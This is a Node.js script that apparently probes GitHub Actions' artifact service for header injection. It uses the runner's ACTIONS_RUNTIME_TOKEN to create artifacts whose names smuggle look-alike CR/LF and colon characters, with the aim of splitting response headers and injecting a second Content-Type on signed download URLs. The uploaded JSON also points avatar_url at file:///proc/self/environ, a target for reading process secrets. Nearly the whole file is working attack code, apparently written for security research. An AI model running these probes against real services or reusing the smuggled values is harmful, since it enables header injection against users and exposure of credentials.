'use strict';

const crypto = require('node:crypto');
const https = require('node:https');

const SERVICE = '/twirp/github.actions.results.api.v1.ArtifactService/';
const CR = String.fromCodePoint(0x010d);
const LF = String.fromCodePoint(0x010a);
const COLON = String.fromCodePoint(0x013a);
const NEL = String.fromCodePoint(0x0185);

function context() {
  const token = process.env.ACTIONS_RUNTIME_TOKEN;
  const base = new URL(process.env.ACTIONS_RESULTS_URL).origin;
  const payload = JSON.parse(Buffer.from(token.split('.')[1], 'base64url'));
  const scope = payload.scp.split(' ').find((value) => value.startsWith('Actions.Results:'));
  const [, runId, jobId] = scope.split(':');
  return { token, base, runId, jobId };
}

async function rpc(ctx, method, fields) {
  const response = await fetch(ctx.base + SERVICE + method, {
    method: 'POST',
    headers: { Authorization: `Bearer ${ctx.token}`, 'Content-Type': 'application/json' },
    body: JSON.stringify({ workflow_run_backend_id: ctx.runId,
      workflow_job_run_backend_id: ctx.jobId, ...fields }),
  });
  return { status: response.status, body: await response.json().catch(() => ({})) };
}

function rawGet(url) {
  return new Promise((resolve) => {
    const request = https.get(url, { agent: false }, (response) => {
      const chunks = [];
      response.on('data', (chunk) => chunks.push(chunk));
      response.on('end', () => {
        const selected = {};
        for (const name of ['content-type', 'content-disposition', 'x-probe', 'x-fill']) {
          if (response.headers[name] !== undefined) {
            selected[name] = Buffer.from(String(response.headers[name]), 'latin1').toString('hex');
          }
        }
        const raw = [];
        for (let index = 0; index < response.rawHeaders.length; index += 2) {
          const name = response.rawHeaders[index].toLowerCase();
          if (['content-type', 'content-disposition', 'x-probe', 'x-fill'].includes(name)) {
            raw.push([name, Buffer.from(response.rawHeaders[index + 1], 'latin1').toString('hex')]);
          }
        }
        resolve({ status: response.statusCode, headers: selected, raw,
          bodyLength: Buffer.concat(chunks).length,
          bodyPrefixHex: Buffer.concat(chunks).subarray(0, 96).toString('hex') });
      });
    });
    request.on('error', (error) => resolve({ error: `${error.code || ''}:${error.message}` }));
  });
}

(async () => {
  const ctx = context();
  const payload = Buffer.from('{"full_name":"header/probe","owner":{"login":"p","avatar_url":"file:///proc/self/environ"}}');
  const names = [
    ['unicode-nel', `name-${NEL}.json`, 'application/json'],
    ['unicode-cr', `name-${CR}.json`, 'application/json'],
    ['header-split', `split-${CR}${LF}X-Probe${COLON} yes${CR}${LF}X-Fill${COLON} z.json`, 'application/json'],
    ['ct-split-json', `ct-${CR}${LF}Content-Type${COLON} ${NEL}application/json${CR}${LF}X-Fill${COLON} z.json`, 'application/json'],
    ['ct-split-text', `ct-${CR}${LF}Content-Type${COLON} ${NEL}application/json${CR}${LF}X-Fill${COLON} z.txt`, 'text/plain'],
  ];
  for (let index = 0; index < names.length; index += 1) {
    const [label, name, mime] = names[index];
    const created = await rpc(ctx, 'CreateArtifact', { name, version: 7, mime_type: mime });
    const uploadUrl = created.body.signed_upload_url || created.body.signedUploadUrl;
    const output = { label, create: created.status, accepted: Boolean(uploadUrl) };
    if (uploadUrl) {
      const uploaded = await fetch(uploadUrl, { method: 'PUT',
        headers: { 'Content-Type': 'application/octet-stream', 'x-ms-blob-type': 'BlockBlob' }, body: payload });
      const finalized = await rpc(ctx, 'FinalizeArtifact', { name, size: String(payload.length),
        hash: `sha256:${crypto.createHash('sha256').update(payload).digest('hex')}` });
      const signed = await rpc(ctx, 'GetSignedArtifactURL', { name });
      const downloadUrl = signed.body.signed_url || signed.body.signedUrl;
      output.upload = uploaded.status;
      output.finalize = finalized.status;
      output.artifactId = finalized.body.artifact_id || finalized.body.artifactId || null;
      output.signed = signed.status;
      if (downloadUrl) {
        const rscd = new URL(downloadUrl).searchParams.get('rscd') || '';
        output.rscdCodepoints = Array.from(rscd, (char) => char.codePointAt(0).toString(16)).join(',');
        output.get = await rawGet(downloadUrl);
      }
    }
    console.log('NAME ' + JSON.stringify(output));
  }

  const absentCases = [
    ['absent', {}], ['empty', { mime_type: '' }], ['null', { mime_type: null }],
  ];
  for (let index = 0; index < absentCases.length; index += 1) {
    const [label, fields] = absentCases[index];
    const name = `missing-mime-${label}-${Date.now()}`;
    const created = await rpc(ctx, 'CreateArtifact', { name, version: 7, ...fields });
    console.log('MISSING ' + JSON.stringify({ label, create: created.status,
      accepted: Boolean(created.body.signed_upload_url || created.body.signedUploadUrl),
      message: created.body.msg || created.body.message || created.body.code || '' }));
  }
})().catch((error) => {
  console.error(error && error.stack || error);
  process.exitCode = 1;
});
